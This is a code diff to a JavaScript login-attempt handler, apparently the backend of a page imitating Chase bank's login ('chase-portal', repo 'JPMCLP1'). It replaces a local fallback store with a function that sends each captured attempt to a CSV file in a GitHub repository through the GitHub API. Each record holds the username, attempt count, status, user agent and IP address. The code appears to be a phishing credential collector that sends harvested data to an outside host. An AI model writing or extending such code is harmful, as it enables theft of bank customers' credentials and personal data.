@@ -1,7 +1,8 @@
 import mongoose from 'mongoose';
-import { sharedStorage } from './shared-storage.js';
 
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';
+const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
+const GITHUB_REPO = process.env.GITHUB_REPO || 'sapphirenetllc/JPMCLP1';
 
 // Login Log Schema
 const loginLogSchema = new mongoose.Schema({
@@ -32,9 +33,77 @@ async function connectDB() {
     console.log('✅ Connected to MongoDB');
     return connection;
   } catch (err) {
-    console.warn('⚠️  MongoDB connection failed');
+    console.warn('⚠️  MongoDB connection failed:', err.message);
     dbConnected = false;
     return null;
+  }
+}
+
+async function saveToGitHub(logData) {
+  if (!GITHUB_TOKEN) {
+    console.warn('⚠️  GITHUB_TOKEN not set, skipping GitHub backup');
+    return false;
+  }
+
+  try {
+    // Format log as CSV line
+    const csvLine = [
+      new Date(logData.timestamp).toISOString(),
+      logData.username,
+      '***', // Don't store password in public repo
+      logData.attemptNumber,
+      logData.status,
+      logData.userAgent,
+      logData.ipAddress
+    ].join(',');
+
+    // Append to CSV file in GitHub
+    const filePath = 'logs/login_attempts.csv';
+    const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
+    
+    // Get current file content
+    const getResponse = await fetch(url, {
+      headers: {
+        'Authorization': `token ${GITHUB_TOKEN}`,
+        'Accept': 'application/vnd.github.v3+json'
+      }
+    });
+
+    let newContent = csvLine + '\n';
+    let sha = null;
+
+    if (getResponse.ok) {
+      const data = await getResponse.json();
+      const currentContent = Buffer.from(data.content, 'base64').toString('utf-8');
+      newContent = currentContent + csvLine + '\n';
+      sha = data.sha;
+    }
+
+    // Update file
+    const response = await fetch(url, {
+      method: 'PUT',
+      headers: {
+        'Authorization': `token ${GITHUB_TOKEN}`,
+        'Accept': 'application/vnd.github.v3+json',
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        message: `Log login attempt: ${logData.username}`,
+        content: Buffer.from(newContent).toString('base64'),
+        sha
+      })
+    });
+
+    if (response.ok) {
+      console.log('✅ Logged to GitHub');
+      return true;
+    } else {
+      console.warn('⚠️  Failed to log to GitHub:', response.status);
+      return false;
+    }
+  } catch (err) {
+    console.error('Error saving to GitHub:', err.message);
+    return false;
   }
 }
 
@@ -67,7 +136,7 @@ export default async function handler(req, res) {
         ipAddress,
       };
       
-      let stored = 'Fallback';
+      let stored = 'GitHub';
       
       if (dbConnected) {
         try {
@@ -77,12 +146,12 @@ export default async function handler(req, res) {
         } catch (err) {
           console.error('Error saving to MongoDB:', err.message);
           dbConnected = false;
-          // Store in fallback
-          sharedStorage.addLog(logData);
+          // Try GitHub backup
+          await saveToGitHub(logData);
         }
       } else {
-        // Store in fallback array
-        sharedStorage.addLog(logData);
+        // Try GitHub backup
+        await saveToGitHub(logData);
       }
       
       console.log(`[${new Date().toISOString()}] Login attempt logged: ${username} (Attempt #${attemptNumber} - ${status}) [${stored}]`);
